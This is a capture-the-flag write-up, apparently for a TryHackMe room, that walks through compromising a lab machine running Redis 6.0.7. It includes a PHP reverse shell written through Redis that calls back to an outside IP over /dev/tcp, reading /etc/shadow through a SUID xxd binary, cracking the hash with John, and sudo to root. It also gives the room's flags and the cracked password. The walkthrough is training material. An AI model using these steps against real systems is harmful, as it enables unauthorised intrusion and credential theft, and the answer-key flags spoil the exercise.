### Scan the machine, how many ports are open?
Use nmap to check all ports and gather service version information:
```BASH
sudo nmap -sV -p- $ip
```
![image](https://github.com/user-attachments/assets/ee3ea360-20fa-4383-bb47-ffd540e5ace7)

<pre>2</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's is the database management system installed on the server?
<pre>redis</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What port is the database management system running on?
<pre>6379</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's is the version of management system installed on the server?
<pre>6.0.7</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Compromise the machine and locate user.txt
Connect to Redis:
```BASH
redis-cli -h 10.10.96.238 6379
```
![image-1](https://github.com/user-attachments/assets/5284fa55-238f-4bbd-b0aa-e36613d54b39)

Lua scripting is allowed, but it is sandboxed so you cannot run system commands directly.

<span style="line-height:0.5;">&nbsp;</span>

Open a netcat listener on your machine:
```BASH
nc -lvnp 4444
```

Use Redis to create a reverse shell file in the web directory:
```BASH
flushall
set x "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.220.167/4444 0>&1\"'); ?>"
config set dir /var/www/html/
config set dbfilename shell.php
save
```

After running save, the reverse shell will be written as shell.php. Visiting it in a browser triggers a connection to your netcat listener.

![image-4](https://github.com/user-attachments/assets/cd15f00d-c19d-4250-83f9-b4f08b679584)  

Spawn a TTY shell:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Look for user flag by using grep:
```BASH
grep -r --include="user.txt" . /home 2>/dev/null
```
![image-7](https://github.com/user-attachments/assets/934584e1-449b-4696-a549-7d570cfc0adf)

<pre>thm{red1s_rce_w1thout_credent1als}</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the local user account password?
Notice the local user is vianka. Look for SUID binaries to find possible privilege escalation paths:
```BASH
find / -perm -4000 -type f 2>/dev/null
```
![image-6](https://github.com/user-attachments/assets/c181acb3-c48c-413e-8a7f-19aa5eb93e66)

The binary /usr/bin/xxd is exploitable. Go to [GTFObins](https://gtfobins.github.io/#) and search for xxd. Use xxd to read `/etc/shadow`, where Linux stores password hashes:

```BASH
LFILE=/etc/shadow
sudo xxd "$LFILE" | xxd -r
```
![image-8](https://github.com/user-attachments/assets/2a35b346-ab7f-4504-b390-cd31a1546ee3)


Run [John the Ripper](https://github.com/openwall/john) to crack the hash:
```BASH
/usr/sbin/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![image-9](https://github.com/user-attachments/assets/43e5b941-f70d-4046-8160-314a0be1fe7f)

<pre>beautiful1</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Escalate privileges and obtain root.txt
Switch to vianka and check sudo privileges:
```BASH
sudo -l
```
![image-10](https://github.com/user-attachments/assets/daa696a9-e1d4-4d01-9ec4-b224a70df280)

Shows that vianka has full sudo access without restriction.

Get root and read the root flag:
```BASH
sudo su -
cd /root
cat root.txt
```
![image-11](https://github.com/user-attachments/assets/9b3b64d6-79b8-46e6-9977-2f4b71bdb026)

<pre>thm{xxd_pr1v_escalat1on}</pre>

<span style="line-height:0.5;">&nbsp;</span>
